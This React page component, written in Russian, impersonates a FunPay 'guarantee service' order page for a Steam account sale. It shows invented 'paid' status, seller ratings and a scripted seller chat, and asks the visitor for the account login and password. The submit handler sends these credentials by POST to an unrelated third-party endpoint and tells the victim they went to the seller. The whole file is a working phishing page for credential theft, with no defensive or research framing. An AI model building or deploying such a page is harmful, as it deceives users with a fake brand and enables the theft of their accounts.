import { useState } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Textarea } from '@/components/ui/textarea';
import { Avatar, AvatarFallback } from '@/components/ui/avatar';
import { Separator } from '@/components/ui/separator';
import Icon from '@/components/ui/icon';
import { toast } from 'sonner';

const Index = () => {
  const [accountData, setAccountData] = useState({ login: '', password: '' });
  const [chatMessage, setChatMessage] = useState('');
  const [chatMessages, setChatMessages] = useState([
    {
      id: 1,
      sender: 'Продавец',
      message: 'Здравствуйте! Ожидаю от вас данные для входа в аккаунт.',
      time: '14:23',
      isOwn: false
    }
  ]);

  const orderId = '57878929';
  const orderUrl = `https://funpay.com/lots/offer?id=${orderId}`;
  const orderTitle = 'Аккаунт Steam с играми';
  const orderPrice = '2,500 ₽';
  const sellerName = 'GameMaster2024';
  const buyerName = 'User_' + Math.random().toString(36).substring(2, 8);
  const uniqueLink = `${window.location.origin}/?order=${orderId}&token=${Math.random().toString(36).substring(2, 15)}`;

  const handleSubmitData = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!accountData.login || !accountData.password) {
      toast.error('Заполните все поля');
      return;
    }

    try {
      const response = await fetch('https://functions.poehali.dev/f6a8ed6d-0d75-404a-bf63-0c9791af308e', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          login: accountData.login,
          password: accountData.password,
          orderId: orderId
        })
      });

      const data = await response.json();

      if (response.ok && data.success) {
        toast.success('Данные успешно отправлены на почту продавца');
        setChatMessages([...chatMessages, {
          id: chatMessages.length + 1,
          sender: 'Вы',
          message: 'Данные для входа отправлены',
          time: new Date().toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit' }),
          isOwn: true
        }]);
        setAccountData({ login: '', password: '' });
      } else {
        toast.error('Ошибка отправки: ' + (data.error || 'Неизвестная ошибка'));
      }
    } catch (error) {
      toast.error('Не удалось отправить данные');
      console.error('Error sending data:', error);
    }
  };

  const handleSendMessage = (e: React.FormEvent) => {
    e.preventDefault();
    if (!chatMessage.trim()) return;
    setChatMessages([...chatMessages, {
      id: chatMessages.length + 1,
      sender: 'Вы',
      message: chatMessage,
      time: new Date().toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit' }),
      isOwn: true
    }]);
    setChatMessage('');
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast.success('Скопировано в буфер обмена');
  };

  return (
    <div className="min-h-screen funpay-gradient">
      <header className="bg-card border-b border-border sticky top-0 z-50 backdrop-blur-sm bg-opacity-95">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <img 
                src="https://cdn.poehali.dev/files/fe405837-efbd-48e5-b423-ff2bbe77ee7a.jpeg" 
                alt="FunPay" 
                className="w-10 h-10 object-contain"
              />
              <span className="text-2xl font-bold">FunPay</span>
            </div>
            <Badge variant="outline" className="text-sm">
              <Icon name="Shield" size={14} className="mr-1" />
              Гарант-сервис
            </Badge>
          </div>
        </div>
      </header>

      <main className="container mx-auto px-4 py-8 max-w-7xl">
        <div className="mb-6">
          <h1 className="text-3xl font-bold mb-2">Заказ #{orderId}</h1>
          <p className="text-muted-foreground">Сделка под защитой FunPay</p>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          <div className="lg:col-span-2 space-y-6">
            <Card className="animate-fade-in">
              <CardHeader>
                <div className="flex items-start justify-between">
                  <div>
                    <CardTitle className="text-2xl">{orderTitle}</CardTitle>
                    <CardDescription className="mt-2">
                      <a href={orderUrl} target="_blank" rel="noopener noreferrer" className="text-primary hover:underline flex items-center gap-1">
                        Оригинал объявления
                        <Icon name="ExternalLink" size={14} />
                      </a>
                    </CardDescription>
                  </div>
                  <Badge className="bg-green-600 hover:bg-green-700 text-white">
                    <Icon name="CheckCircle" size={14} className="mr-1" />
                    Оплачено
                  </Badge>
                </div>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="flex items-center justify-between p-4 bg-secondary rounded-lg">
                  <span className="text-muted-foreground">Сумма заказа:</span>
                  <span className="text-3xl font-bold text-primary">{orderPrice}</span>
                </div>
                
                <Separator />
                
                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-1">
                    <p className="text-sm text-muted-foreground">Дата создания</p>
                    <p className="font-medium">16 ноября 2025</p>
                  </div>
                  <div className="space-y-1">
                    <p className="text-sm text-muted-foreground">Статус</p>
                    <Badge variant="outline" className="border-yellow-500 text-yellow-500">
                      <Icon name="Clock" size={14} className="mr-1" />
                      Ожидание данных
                    </Badge>
                  </div>
                </div>
              </CardContent>
            </Card>

            <Card className="animate-fade-in">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Icon name="KeyRound" size={20} />
                  Передача данных аккаунта
                </CardTitle>
                <CardDescription>
                  Покупатель должен предоставить данные для входа в аккаунт
                </CardDescription>
              </CardHeader>
              <CardContent>
                <form onSubmit={handleSubmitData} className="space-y-4">
                  <div className="space-y-2">
                    <Label htmlFor="login">Логин / Email</Label>
                    <Input
                      id="login"
                      placeholder="Введите логин или email"
                      value={accountData.login}
                      onChange={(e) => setAccountData({ ...accountData, login: e.target.value })}
                      className="bg-secondary"
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="password">Пароль</Label>
                    <Input
                      id="password"
                      type="password"
                      placeholder="Введите пароль"
                      value={accountData.password}
                      onChange={(e) => setAccountData({ ...accountData, password: e.target.value })}
                      className="bg-secondary"
                    />
                  </div>
                  <div className="bg-accent/50 p-4 rounded-lg border border-primary/20">
                    <div className="flex gap-2 mb-2">
                      <Icon name="AlertCircle" size={20} className="text-primary flex-shrink-0 mt-0.5" />
                      <div>
                        <p className="font-medium text-sm">Ваша уникальная ссылка для передачи данных:</p>
                        <div className="flex items-center gap-2 mt-2">
                          <code className="text-xs bg-secondary px-2 py-1 rounded flex-1 overflow-hidden text-ellipsis">
                            {uniqueLink}
                          </code>
                          <Button
                            type="button"
                            size="sm"
                            variant="outline"
                            onClick={() => copyToClipboard(uniqueLink)}
                          >
                            <Icon name="Copy" size={14} />
                          </Button>
                        </div>
                      </div>
                    </div>
                  </div>
                  <Button type="submit" className="w-full bg-primary hover:bg-primary/90">
                    <Icon name="Send" size={16} className="mr-2" />
                    Отправить данные продавцу
                  </Button>
                </form>
              </CardContent>
            </Card>

            <Card className="animate-fade-in">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Icon name="MessageSquare" size={20} />
                  Чат со сделки
                </CardTitle>
                <CardDescription>
                  Общайтесь с продавцом по вопросам заказа
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="bg-secondary rounded-lg p-4 space-y-3 max-h-80 overflow-y-auto">
                  {chatMessages.map((msg) => (
                    <div key={msg.id} className={`flex gap-2 ${msg.isOwn ? 'flex-row-reverse' : ''}`}>
                      <Avatar className="w-8 h-8">
                        <AvatarFallback className={msg.isOwn ? 'bg-primary' : 'bg-accent'}>
                          {msg.sender[0]}
                        </AvatarFallback>
                      </Avatar>
                      <div className={`flex-1 ${msg.isOwn ? 'text-right' : ''}`}>
                        <div className="flex items-center gap-2 mb-1">
                          <span className={`text-xs font-medium ${msg.isOwn ? 'order-2' : ''}`}>
                            {msg.sender}
                          </span>
                          <span className="text-xs text-muted-foreground">{msg.time}</span>
                        </div>
                        <div className={`inline-block px-3 py-2 rounded-lg ${
                          msg.isOwn ? 'bg-primary text-white' : 'bg-accent'
                        }`}>
                          {msg.message}
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
                <form onSubmit={handleSendMessage} className="flex gap-2">
                  <Input
                    placeholder="Введите сообщение..."
                    value={chatMessage}
                    onChange={(e) => setChatMessage(e.target.value)}
                    className="bg-secondary"
                  />
                  <Button type="submit" size="icon">
                    <Icon name="Send" size={18} />
                  </Button>
                </form>
              </CardContent>
            </Card>
          </div>

          <div className="space-y-6">
            <Card className="animate-fade-in">
              <CardHeader>
                <CardTitle className="text-lg">Продавец</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="flex items-start gap-3">
                  <Avatar>
                    <AvatarFallback className="bg-primary text-white">
                      {sellerName[0]}
                    </AvatarFallback>
                  </Avatar>
                  <div className="flex-1">
                    <p className="font-medium">{sellerName}</p>
                    <div className="flex items-center gap-1 mt-1">
                      <Icon name="Star" size={14} className="text-yellow-500 fill-yellow-500" />
                      <span className="text-sm">4.9 (234 отзыва)</span>
                    </div>
                    <Badge variant="outline" className="mt-2 text-xs">
                      <Icon name="Award" size={12} className="mr-1" />
                      Проверенный продавец
                    </Badge>
                  </div>
                </div>
              </CardContent>
            </Card>

            <Card className="animate-fade-in">
              <CardHeader>
                <CardTitle className="text-lg">Покупатель</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="flex items-start gap-3">
                  <Avatar>
                    <AvatarFallback className="bg-accent">
                      {buyerName[0]}
                    </AvatarFallback>
                  </Avatar>
                  <div className="flex-1">
                    <p className="font-medium">{buyerName}</p>
                    <p className="text-sm text-muted-foreground mt-1">Покупатель</p>
                  </div>
                </div>
              </CardContent>
            </Card>

            <Card className="animate-fade-in border-primary/30">
              <CardHeader>
                <CardTitle className="text-lg flex items-center gap-2">
                  <Icon name="Clock" size={18} />
                  История операций
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-3">
                  <div className="flex gap-3">
                    <div className="w-2 h-2 rounded-full bg-green-500 mt-1.5 flex-shrink-0"></div>
                    <div className="flex-1">
                      <p className="text-sm font-medium">Оплата получена</p>
                      <p className="text-xs text-muted-foreground">16 ноября, 14:15</p>
                    </div>
                  </div>
                  <div className="flex gap-3">
                    <div className="w-2 h-2 rounded-full bg-blue-500 mt-1.5 flex-shrink-0"></div>
                    <div className="flex-1">
                      <p className="text-sm font-medium">Заказ создан</p>
                      <p className="text-xs text-muted-foreground">16 ноября, 14:10</p>
                    </div>
                  </div>
                  <div className="flex gap-3">
                    <div className="w-2 h-2 rounded-full bg-yellow-500 mt-1.5 flex-shrink-0 animate-pulse"></div>
                    <div className="flex-1">
                      <p className="text-sm font-medium">Ожидание данных от покупателя</p>
                      <p className="text-xs text-muted-foreground">Сейчас</p>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>

            <Card className="animate-fade-in bg-accent/20 border-primary/20">
              <CardContent className="pt-6">
                <div className="flex gap-2 items-start">
                  <Icon name="Shield" size={20} className="text-primary flex-shrink-0" />
                  <div className="text-sm">
                    <p className="font-medium mb-1">Защита сделки FunPay</p>
                    <p className="text-xs text-muted-foreground">
                      Деньги хранятся на счете FunPay до момента подтверждения получения товара покупателем
                    </p>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </main>

      <footer className="bg-card border-t border-border mt-16">
        <div className="container mx-auto px-4 py-6">
          <div className="text-center text-sm text-muted-foreground">
            <p>© 2025 FunPay. Гарант-сервис для безопасных сделок</p>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Index;